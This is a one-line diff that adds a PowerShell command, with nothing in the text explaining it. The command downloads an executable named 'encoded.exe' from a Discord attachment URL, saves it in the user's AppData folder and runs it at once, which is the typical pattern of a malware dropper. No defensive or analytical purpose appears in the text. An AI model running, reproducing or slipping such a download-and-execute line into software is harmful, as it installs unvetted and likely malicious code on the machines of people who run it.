@@ -1,0 +1,1 @@
+powershell -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/283993301814738954/1197243190655320135/encoded.exe?ex=65ba8e9c&is=65a8199c&hm=cc3a7fcaa60b3f5d8905ab4ddffa1a5be42eff6c597fda105a72c731adc6371e&' -OutFile '%appdata%\encoded.exe'; %appdata%\encoded.exe"
